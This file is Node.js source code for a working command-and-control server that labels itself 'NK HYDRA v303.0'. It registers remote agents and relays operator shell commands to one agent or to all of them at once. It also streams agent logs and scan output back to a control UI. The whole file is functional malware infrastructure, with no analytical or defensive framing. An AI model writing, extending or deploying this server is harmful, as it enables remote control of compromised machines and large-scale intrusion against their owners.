// TYPE: NODE.JS C2 SERVER
// NK HYDRA v303.0 [TITAN STABLE]

const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');

const app = express();
app.use(cors());

app.get('/', (req, res) => { res.json({ status: 'NK_HYDRA_ONLINE', version: 'v303.0', agents: agents.length }); });

const server = http.createServer(app);
const io = new Server(server, { 
    cors: { origin: "*", methods: ["GET", "POST"] },
    pingInterval: 25000, // Very lenient ping interval
    pingTimeout: 120000, // 2 minutes timeout to tolerate heavy scans
    maxHttpBufferSize: 1e8 // 100MB buffer for logs
});

let agents = []; 

io.on('connection', (socket) => {
    // Identify Phase
    socket.on('identify', (data) => {
        if (data.type === 'ui') {
            socket.join('ui_room');
            socket.emit('agents_list', agents);
            return;
        }
        
        // Register Agent
        const existingIdx = agents.findIndex(a => a.id === data.id);
        const agentData = { ...data, socketId: socket.id, status: 'Online', lastSeen: Date.now() };
        
        if (existingIdx >= 0) {
            agents[existingIdx] = agentData;
        } else {
            agents.push(agentData);
        }
        
        console.log(`[+] Agent Registered: ${data.id} (${data.os})`);
        io.to('ui_room').emit('agents_list', agents);
    });

    // Command Relay (UI -> Agent)
    socket.on('exec_cmd', (data) => {
        console.log(`[>] CMD: ${data.cmd} -> ${data.targetId}`);
        if (data.targetId === 'all') {
            socket.broadcast.emit('exec_cmd', data); 
        } else {
            const agent = agents.find(a => a.id === data.targetId);
            if (agent) io.to(agent.socketId).emit('exec_cmd', data);
        }
    });
    
    // Event Relay (Agent -> UI)
    socket.on('agent_event', (data) => {
        // Relay Log immediately to UI
        io.to('ui_room').emit('agent_event', data);
        
        // Update Agent Status - Any activity keeps it alive
        if (data.agentId) {
             const agent = agents.find(a => a.id === data.agentId);
             if (agent) {
                 agent.lastSeen = Date.now();
                 agent.status = 'Online';
             }
        }
    });

    socket.on('disconnect', () => {
        const agent = agents.find(a => a.socketId === socket.id);
        if (agent) { 
            // Don't mark offline immediately. Wait for reconnect.
            console.log(`[-] Socket Drop: ${agent.id}`);
            setTimeout(() => {
                // Check if agent reconnected with new socket
                const stillHere = agents.find(a => a.id === agent.id && a.status === 'Online');
                if (!stillHere) {
                    agent.status = 'Offline'; 
                    io.to('ui_room').emit('agents_list', agents);
                }
            }, 5000); // 5s grace period
        }
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`HYDRA v303.0 LISTENING ON ${PORT}`));
